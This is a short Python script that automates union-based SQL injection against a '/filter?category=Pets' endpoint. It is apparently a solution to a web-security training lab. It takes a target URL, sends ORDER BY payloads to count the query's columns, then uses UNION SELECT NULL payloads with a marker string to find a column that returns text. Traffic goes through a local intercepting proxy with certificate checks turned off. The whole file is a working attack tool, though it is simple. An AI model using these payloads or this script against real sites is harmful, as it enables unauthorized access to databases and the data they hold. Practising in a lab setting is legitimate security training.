import requests
import urllib3
import sys

# DEFAULTS

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'127.0.0.1:8080', 'https':'127.0.0.1:8080'}

def find_str_col(s,url,num):
    uri = "/filter?category=Pets'UNION+SELECT+"
    for i in range(1,num+1):
        null_list = ["NULL"]*num
        null_list[i-1] = "'uKB4ZC'"
        query = ",".join(null_list)+"--"
        r  = s.get(url+uri+query, verify=False, proxies=proxies )
        if "uKB4ZC" in r.text:
            return i
    return False


def get_col_num(s,url):
    uri = "/filter?category=Pets"
    for i in range(1,50):
        column = "'ORDER+BY+%s--" %i
        r = s.get(url+uri+column, verify=False, proxies=proxies)
        if "Internal Server Error" in r.text:
            return find_str_col(s,url,i-1), i-1
    return False, False    


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url> " % sys.argv[0])
        print('[-] Example: %s www.example.com ' % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    col_str, col_num = get_col_num(s,url)
    if col_num:
        print("[+] SQL Injection successfull "+str(col_num))
        print("[+] SQL Injection successfull: column with string is:  "+str(col_str))
    else:
        print("[-] SQL Injection unsuccessfull ")